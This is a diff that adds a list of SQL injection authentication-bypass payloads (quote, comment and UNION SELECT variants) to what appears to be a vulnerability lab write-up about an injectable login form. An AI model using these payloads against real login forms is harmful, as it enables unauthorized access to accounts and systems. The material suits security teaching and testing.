@@ -38,6 +38,100 @@ The login form allows SQL injection through both username and password fields, d
    ```
 4. Click Login
 
+##### SQL Injection Payloads or 1=1
+
+or 1=1--
+
+or 1=1#
+
+or 1=1/*
+
+admin' --
+
+admin' #
+
+admin'/*
+
+admin' or '1'='1
+
+admin' or '1'='1'--
+
+admin' or '1'='1'#
+
+admin' or '1'='1'/*
+
+admin'or 1=1 or ''='
+
+admin' or 1=1
+
+admin' or 1=1--
+
+admin' or 1=1#
+
+admin' or 1=1/*
+
+admin') or ('1'='1
+
+admin') or ('1'='1'--
+
+admin') or ('1'='1'#
+
+admin') or ('1'='1'/*
+
+admin') or '1'='1
+
+admin') or '1'='1'--
+
+admin') or '1'='1'#
+
+admin') or '1'='1'/*
+
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
+admin" --
+
+admin" #
+
+admin"/*
+
+admin" or "1"="1
+
+admin" or "1"="1"--
+
+admin" or "1"="1"#
+
+admin" or "1"="1"/*
+
+admin"or 1=1 or ""="
+
+admin" or 1=1
+
+admin" or 1=1--
+
+admin" or 1=1#
+
+admin" or 1=1/*
+
+admin") or ("1"="1
+
+admin") or ("1"="1"--
+
+admin") or ("1"="1"#
+
+admin") or ("1"="1"/*
+
+admin") or "1"="1
+
+admin") or "1"="1"--
+
+admin") or "1"="1"#
+
+admin") or "1"="1"/*
+
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
+
+
 #### **Expected Result**
 - Both methods will result in successful login
 - The server will log the executed SQL query showing the injection
